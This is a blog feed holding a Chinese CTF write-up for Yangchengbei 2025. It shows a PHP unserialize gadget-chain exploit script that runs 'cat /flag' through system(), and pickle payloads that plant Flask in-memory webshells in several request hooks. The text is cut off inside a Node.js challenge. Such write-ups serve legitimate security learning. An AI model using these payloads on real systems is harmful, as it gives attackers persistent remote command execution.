<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HvAng&#39;s Nests</title>
  
  <subtitle>Nice to meet you!</subtitle>
  <link href="https://hvang10.github.io/atom.xml" rel="self"/>
  
  <link href="https://hvang10.github.io/"/>
  <updated>2025-10-12T19:18:57.801Z</updated>
  <id>https://hvang10.github.io/</id>
  
  <author>
    <name>HvAng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>羊城杯2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/</id>
    <published>2025-10-12T16:00:00.000Z</published>
    <updated>2025-10-12T19:18:57.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1-ez-unserialize"><a href="#web1-ez-unserialize" class="headerlink" title="web1 ez_unserialize"></a>web1 ez_unserialize</h2><blockquote><p>开胃小菜</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;first = <span class="string">&quot;继续加油！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;secret&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot; maybe is here!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;found-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/U/&quot;</span>,<span class="variable">$this</span>-&gt;finalstep)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仔细想想！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;step = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">finalstep</span>();</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;step)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;you = <span class="string">&quot;nobody&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;who-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$func_name</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func_name</span>,<span class="variable">$args</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;there-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$abc</span> = <span class="variable language_">$this</span>-&gt;dowhat;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go-&gt;<span class="variable">$abc</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>交给<code>AI</code>梭一下<strong>反序列化</strong>，<code>ChatGPT</code>有时还是挺给力的</p><p>目标代码里 <code>unserialize($_POST[&#39;payload&#39;]);</code> 可控对象反序列化。我们观察到几处可利用的魔术方法/链：</p><ul><li><code>H::__destruct()</code> 会调用 <code>$this-&gt;who-&gt;start()</code> → 如果 <code>who</code> 是 <code>A</code>，<code>A::start()</code> 会 <code>echo $this-&gt;next</code>（对 <code>next</code> 进行字符串化）</li><li>如果 <code>next</code> 是 <code>V</code> 对象，则 <code>V::__toString()</code> 被触发：它读取 <code>$this-&gt;dowhat</code> 到 <code>$abc</code>，再执行 <code>$this-&gt;go-&gt;$abc</code></li><li>如果 <code>V-&gt;dowhat = &quot;secret&quot;</code> 且 <code>V-&gt;go</code> 是 <code>E</code> 对象，那么对 <code>E-&gt;secret</code> 的访问会触发 <code>E::__get()</code>，里面会调用 <code>$this-&gt;found-&gt;check()</code></li><li><code>F::check()</code> 会 <code>new $this-&gt;finalstep()</code>（如果 <code>finalstep</code> 中包含大写 <code>U</code> 会被 <code>preg_match(&quot;/U/&quot;)</code> 检出并中断），然后对新对象做 <code>($this-&gt;step)();</code>（即调用对象的 <code>__invoke</code>）</li><li><code>U::__invoke()</code> 会调用 <code>$this-&gt;there-&gt;system($this-&gt;cmd)</code>，而 <code>there</code> 是 <code>N</code>，<code>N::__call</code> 会把 <code>system</code> 转成全局 <code>system()</code> 调用，从而执行任意 <code>shell</code>命令（<code>$_POST[&#39;cmd&#39;]</code> 被用作命令）</li></ul><p>关键绕过点：<code>F::check</code> 用了 <code>preg_match(&quot;/U/&quot;,$this-&gt;finalstep)</code>——只要把 <code>finalstep</code> 设为小写的 <code>&quot;u&quot;</code>（类名大小写在 <code>PHP</code> 中不敏感），就能绕过该检查并成功 <code>new &#39;u&#39;()</code> 以实例化类 <code>U</code></p><p>因此构造链（简化理解）：<br><code>H(where-&gt;who = A) -&gt; A-&gt;next = V -&gt; V-&gt;dowhat = &quot;secret&quot;, V-&gt;go = E -&gt; E-&gt;found = F -&gt; F-&gt;finalstep = &quot;u&quot;</code><br>同时 <code>POST</code> 包含<code>cmd=cat /flag</code>。在脚本结束时 <code>H::__destruct</code> 触发，链路走通，最终调用 <code>system(&#39;cat /flag&#39;)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://45.40.247.139:20983/&#x27;</span>; </span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;first = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;secret&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot; maybe is here!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;found-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/U/&quot;</span>, <span class="variable">$this</span>-&gt;finalstep)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仔细想想！&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;step = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">finalstep</span>();</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;step)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;you = <span class="string">&quot;nobody&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;who-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$func_name</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func_name</span>, <span class="variable">$args</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;there-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$abc</span> = <span class="variable language_">$this</span>-&gt;dowhat;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go-&gt;<span class="variable">$abc</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 构造对象图 */</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;finalstep = <span class="string">&#x27;u&#x27;</span>; <span class="comment">// 小写 u，避开 preg_match(&quot;/U/&quot;)，但依然能 new &#x27;u&#x27;()（PHP 类名不区分大小写）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;found = <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"><span class="variable">$v</span>-&gt;dowhat = <span class="string">&#x27;secret&#x27;</span>; <span class="comment">// 触发 E::__get</span></span><br><span class="line"><span class="variable">$v</span>-&gt;go = <span class="variable">$e</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;next = <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;who = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 序列化 payload */</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送 POST */</span></span><br><span class="line"><span class="variable">$post</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;payload&#x27;</span> =&gt; <span class="variable">$payload</span>,</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span> =&gt; <span class="variable">$cmd</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$err</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;cURL error: <span class="subst">$err</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=== Response from server ===\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web2-ezsignin"><a href="#web2-ezsignin" class="headerlink" title="web2 ezsignin*"></a>web2 ezsignin*</h2><blockquote><p>一个没写完的文件系统</p></blockquote><h2 id="web3-ez-blog"><a href="#web3-ez-blog" class="headerlink" title="web3 ez_blog"></a>web3 ez_blog</h2><blockquote><p>你能发现博客系统中的漏洞吗？</p></blockquote><p>提示我们：访客只能用访客账号登录哦！<br>弱口令：<code>guest/guest</code></p><p>发现一个十六进制的<code>Token</code>，解码发现有<code>guest is_admin</code>的信息，想到要打<code>pickle</code>反序列化</p><p>打<strong>Flask内存马</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line">        <span class="comment"># return (exec, (&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read())&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(b.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># 800495af000000000000008c086275696c74696e73948c04657865639493948c935f5f696d706f72745f5f282773797327292e6d6f64756c65735b275f5f6d61696e5f5f275d2e5f5f646963745f5f5b27617070275d2e6265666f72655f726571756573745f66756e63732e73657464656661756c74284e6f6e652c5b5d292e617070656e64286c616d626461203a5f5f696d706f72745f5f28276f7327292e706f70656e2827656e7627292e7265616428292994859452942e</span></span><br></pre></td></tr></table></figure><p>还有一些其他的钩子函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># after_request</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># teardown_request</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># teardown_appcontext</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_appcontext_funcs.append(lambda error: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># errorhandler</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br></pre></td></tr></table></figure><h2 id="web4-auth-web"><a href="#web4-auth-web" class="headerlink" title="web4 auth_web*"></a>web4 auth_web*</h2><blockquote><p>为了系统安全，我在自己的开源项目代码中加入了认证方式</p></blockquote><p>我丢，虽然有<code>jar反编译工具</code>，但是懒啊……</p><h2 id="web5-staticNodeService"><a href="#web5-staticNodeService" class="headerlink" title="web5 staticNodeService"></a>web5 staticNodeService</h2><blockquote><p>http.server is a great tool. So I also created one using node.js</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const ejs = require(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">const path = require(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">const PORT = parseInt(process.env.PORT) || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="built_in">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.use(express.json(&#123;</span><br><span class="line">    limit: <span class="string">&#x27;1mb&#x27;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">const STATIC_DIR = path.join(__dirname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// serve index <span class="keyword">for</span> better viewing</span><br><span class="line">function serveIndex(req, res) &#123;</span><br><span class="line">    var templ = req.query.templ || <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    var lsPath = path.join(__dirname, req.path);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.render(templ, &#123;</span><br><span class="line">            filenames: fs.readdirSync(lsPath),</span><br><span class="line">            path: req.path</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">        res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error rendering page&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// static serve <span class="keyword">for</span> simply view/download</span><br><span class="line">app.use(express.static(STATIC_DIR));</span><br><span class="line"></span><br><span class="line">// Security middleware</span><br><span class="line">app.use((req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof req.path !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">        (typeof req.query.templ !== <span class="string">&#x27;string&#x27;</span> &amp;&amp; typeof req.query.templ !== <span class="string">&#x27;undefined&#x27;</span>)</span><br><span class="line">    ) res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error parsing path&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (/js$|\.\./i.test(req.path)) res.status(<span class="number">403</span>).send(<span class="string">&#x27;Denied filename&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// logic middleware</span><br><span class="line">app.use((req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.path.endsWith(<span class="string">&#x27;/&#x27;</span>)) serveIndex(req, res);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Upload operation handler</span><br><span class="line">app.put(<span class="string">&#x27;/*&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    const filePath = path.join(STATIC_DIR, 